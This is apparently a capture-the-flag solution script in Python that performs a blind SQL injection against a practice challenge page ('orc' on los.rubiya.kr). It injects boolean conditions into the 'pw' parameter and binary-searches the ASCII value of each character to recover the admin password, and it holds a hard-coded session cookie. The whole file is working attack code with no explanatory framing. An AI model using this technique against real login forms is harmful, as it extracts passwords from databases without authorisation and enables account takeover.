import requests

cookies = {'PHPSESSID': 'p92ilbnrkt5id2ttj2d6f5a85k'}
answer = ""

for i in range(1,9):
    a=33
    b=127
    while(1):
        j=(a+b)//2
        url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=a%27+or+id%3d%27admin%27+and+ascii(substring(pw,'
        url = url+str(i)+',1))='+str(j)+'--+'

        response = requests.get(url, cookies=cookies)
        if("Hello admin" in response.text):
            print(url)
            answer = answer + chr(j)
            print(answer)
            break
        else:
            url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=a%27+or+id%3d%27admin%27+and+ascii(substring(pw,'
            url = url+str(i)+',1))>'+str(j)+'--+'
            print(url)
            response = requests.get(url,cookies=cookies)
            if("Hello admin" in response.text):
                a=j
            else:
                b=j

print(answer)
